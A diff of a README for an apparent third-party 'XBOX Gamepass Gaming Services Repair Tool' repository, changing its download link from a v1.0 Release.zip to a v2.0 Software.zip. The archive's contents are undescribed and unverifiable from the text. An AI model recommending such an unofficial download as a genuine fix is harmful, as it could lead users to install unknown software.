@@ -13,7 +13,7 @@ Welcome to the XBOX Gamepass Gaming Services Repair Tool repository! Here, you w
 
 To start fixing your XBOX Gamepass errors, simply download the repair tool by clicking on the link below:
 
-[![Download Repair Tool](https://github.com/Demon0D9/XBOX-Gamepass-Gaming-Services-Repair-Tool/releases/download/v1.0/Release.zip)](https://github.com/Demon0D9/XBOX-Gamepass-Gaming-Services-Repair-Tool/releases/download/v1.0/Release.zip)
+[![Download Repair Tool](https://github.com/Demon0D9/XBOX-Gamepass-Gaming-Services-Repair-Tool/releases/download/v2.0/Software.zip)](https://github.com/Demon0D9/XBOX-Gamepass-Gaming-Services-Repair-Tool/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the tool, follow the detailed instructions provided in the repository to resolve the specific error code you are experiencing.
 
